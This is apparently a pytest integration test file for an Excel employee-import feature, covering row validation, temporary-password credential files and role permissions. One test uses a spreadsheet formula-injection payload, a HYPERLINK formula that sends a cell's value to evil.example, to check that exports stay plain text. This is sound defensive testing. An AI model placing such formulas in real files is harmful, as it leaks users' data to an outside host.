"""Nhập nhân viên từ Excel (Bước 6): kiểm tra dòng, nhập, file mật khẩu tạm, phân quyền."""

from __future__ import annotations

import base64
import io
from typing import Any

import openpyxl.xml
import pytest
from openpyxl import Workbook, load_workbook
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.models import (
    AuditLog,
    MemberRole,
    Page,
    PageAssignment,
    Team,
    User,
    Workspace,
    WorkspaceMember,
)
from app.services import import_service
from tests.integration import factories as f

pytestmark = pytest.mark.integration

HEADER = ["Họ tên", "Email", "Nhóm", "Vai trò", "ID hoặc tên Trang"]


def xlsx(rows: list[list[Any]], header: list[str] = HEADER) -> bytes:
    wb = Workbook()
    ws = wb.active
    assert ws is not None
    ws.append(header)
    for r in rows:
        ws.append(r)
    buffer = io.BytesIO()
    wb.save(buffer)
    return buffer.getvalue()


@pytest.fixture
async def p4(admin_db: AsyncSession, org: Any) -> str:
    ws = await admin_db.get(Workspace, org.accounts["owner"].workspace.id)
    assert ws is not None
    page = await f.create_page(admin_db, ws, name="[P4]")
    fb = page.fb_page_id
    await admin_db.commit()
    return fb


async def _preview(client: Any, data: bytes) -> Any:
    return await client.post(
        "/api/imports/members/preview",
        content=data,
        headers={"Content-Type": "application/octet-stream", "X-File-Name": "danh-sach.xlsx"},
    )


def test_openpyxl_uses_defusedxml() -> None:
    assert openpyxl.xml.DEFUSEDXML is True


async def test_template_lists_tracked_pages(as_role: Any, p4: str) -> None:
    manager = await as_role("manager")
    resp = await manager.get("/api/imports/members/template")
    assert resp.status_code == 200
    wb = load_workbook(io.BytesIO(resp.content))
    assert [c.value for c in wb["Nhan vien"][1]] == HEADER
    pages = {row[1] for row in wb["Trang"].iter_rows(min_row=2, values_only=True)}
    assert {"[P1]", "[P2]", "[P3]", "[P4]"} <= pages


async def test_template_and_credentials_are_plain_text(
    as_role: Any, admin_db: AsyncSession, org: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Mục O: tên Trang dạng công thức và mật khẩu bắt đầu bằng '-' giữ nguyên là chữ."""
    ws = await admin_db.get(Workspace, org.accounts["owner"].workspace.id)
    assert ws is not None
    formula = '=HYPERLINK("https://evil.example?"&A1,"Mở")'
    await f.create_page(admin_db, ws, name=formula)
    await admin_db.commit()
    manager = await as_role("manager")
    template = load_workbook(
        io.BytesIO((await manager.get("/api/imports/members/template")).content)
    )
    cell = next(
        c for row in template["Trang"].iter_rows(min_row=2) for c in row if c.value == formula
    )
    assert cell.data_type == "s"

    monkeypatch.setattr(import_service, "_temp_password", lambda: "-Ab3_x9kQ-Tm")
    body = (await _preview(manager, xlsx([["[NV mới]", "moi2@example.com", "", "", ""]]))).json()
    result = (await manager.post(f"/api/imports/{body['id']}/apply")).json()
    creds = load_workbook(io.BytesIO(base64.b64decode(result["credentials_file"])))
    rows = list(creds.active.iter_rows(min_row=2, values_only=True))  # type: ignore[union-attr]
    assert rows == [("[NV mới]", "moi2@example.com", "-Ab3_x9kQ-Tm")]


async def test_preview_then_apply(
    as_role: Any, admin_db: AsyncSession, org: Any, p4: str, client: Any
) -> None:
    s2_email = org.accounts["s2"].email
    manager_email = org.accounts["manager"].email
    rows = [
        ["[NV mới]", "Moi@Example.com", "[Nhóm 9]", "Trưởng nhóm", "[p4]"],
        ["[Nhân viên 2]", s2_email, "[Nhóm 2]", "", "[P2]"],
        ["[Sai email]", "khong-phai-email", "", "", ""],
        ["[Không Trang]", "a@example.com", "", "Nhân viên", "[Không có]"],
        ["[Trang có người]", "b@example.com", "", "", "[P1]"],
        ["[Quản lý]", manager_email, "", "", ""],
        ["[Trùng]", "moi@example.com", "", "", ""],
        ["[Vai trò lạ]", "c@example.com", "", "Giám đốc", ""],
        ["[Trùng Trang]", "d@example.com", "", "", int(p4)],
        ["", "e@example.com", "", "", ""],
    ]
    manager = await as_role("manager")
    resp = await _preview(manager, xlsx(rows))
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert (body["rows_total"], body["rows_ok"], body["rows_failed"]) == (10, 2, 8)
    errors = {r["row"]: r["errors"] for r in body["rows"]}
    assert errors == {
        2: [],
        3: [],
        4: ["email_invalid"],
        5: ["page_not_found"],
        6: ["page_has_owner"],
        7: ["cannot_edit_role"],
        8: ["email_duplicate_in_file"],
        9: ["role_invalid"],
        10: ["page_duplicate_in_file"],
        11: ["name_required"],
    }
    assert [r["action"] for r in body["rows"][:2]] == ["create", "update"]

    applied = await manager.post(f"/api/imports/{body['id']}/apply")
    assert applied.status_code == 200, applied.text
    result = applied.json()
    assert (result["created"], result["updated"], result["skipped"]) == (1, 1, 8)
    creds = load_workbook(io.BytesIO(base64.b64decode(result["credentials_file"])))
    data = list(creds.active.iter_rows(min_row=2, values_only=True))  # type: ignore[union-attr]
    assert [(r[0], r[1]) for r in data] == [("[NV mới]", "moi@example.com")]
    temp_password = data[0][2]

    again = await manager.post(f"/api/imports/{body['id']}/apply")
    assert again.status_code == 409

    admin_db.expire_all()
    user = await admin_db.scalar(select(User).where(User.email == "moi@example.com"))
    assert user is not None and user.must_change_password
    member = await admin_db.scalar(
        select(WorkspaceMember).where(WorkspaceMember.user_id == user.id)
    )
    team = await admin_db.scalar(select(Team).where(Team.name == "[Nhóm 9]"))
    assert member is not None and team is not None
    assert (
        member.role.value == "team_lead"
        and member.team_id == team.id
        and team.lead_member_id == member.id
    )
    page = await admin_db.scalar(select(Page).where(Page.fb_page_id == p4))
    owner = await admin_db.scalar(
        select(PageAssignment.member_id).where(
            PageAssignment.page_id == page.id, PageAssignment.valid_to.is_(None)
        )  # type: ignore[union-attr]
    )
    assert owner == member.id
    audits = (
        await admin_db.scalars(select(AuditLog).where(AuditLog.action == "member.imported"))
    ).all()
    assert len(audits) == 2 and temp_password not in str([a.after for a in audits])

    client.cookies.clear()
    login = await client.post(
        "/api/auth/login", json={"email": "moi@example.com", "password": temp_password}
    )
    assert login.status_code == 200 and login.json()["must_change_password"] is True


@pytest.mark.parametrize(
    ("data", "code", "status"),
    [
        (b"", "import_file_empty", 422),
        (b"khong phai excel", "import_file_invalid", 422),
        (xlsx([["a", "b@example.com"]], header=["Tên", "Thư"]), "import_header_invalid", 422),
        (b"x" * (2 * 1024 * 1024 + 1), "import_file_too_large", 413),
    ],
)
async def test_bad_files(as_role: Any, data: bytes, code: str, status: int) -> None:
    owner = await as_role("owner")
    resp = await _preview(owner, data)
    assert resp.status_code == status and resp.json()["detail"]["code"] == code


async def test_too_many_rows(as_role: Any) -> None:
    owner = await as_role("owner")
    rows = [[f"[NV {i}]", f"nv{i}@example.com", "", "", ""] for i in range(501)]
    resp = await _preview(owner, xlsx(rows))
    assert resp.status_code == 422 and resp.json()["detail"]["code"] == "import_too_many_rows"


async def test_user_from_other_workspace_is_refused(
    as_role: Any, admin_db: AsyncSession, org: Any
) -> None:
    """Mục O: email đã có tài khoản ở workspace khác thì báo lỗi dòng, không nhập."""
    other_ws = await f.create_workspace(admin_db, "[Workspace khác]")
    outsider = await f.create_user(admin_db, email="nguoi-ngoai@example.com")
    await f.create_member(admin_db, other_ws, outsider, MemberRole.STAFF)
    await admin_db.commit()
    manager = await as_role("manager")
    body = (await _preview(manager, xlsx([["[Người ngoài]", outsider.email, "", "", ""]]))).json()
    assert [r["errors"] for r in body["rows"]] == [["email_unavailable"]]
    result = (await manager.post(f"/api/imports/{body['id']}/apply")).json()
    assert (result["created"], result["updated"], result["skipped"]) == (0, 0, 1)
    members = await admin_db.scalars(
        select(WorkspaceMember.workspace_id).where(WorkspaceMember.user_id == outsider.id)
    )
    assert list(members) == [other_ws.id]


@pytest.mark.parametrize("role", ["lead", "s1", "viewer"])
async def test_only_managers_import(as_role: Any, role: str) -> None:
    client = await as_role(role)
    assert (await client.get("/api/imports/members/template")).status_code == 403
    assert (await _preview(client, xlsx([]))).status_code == 403
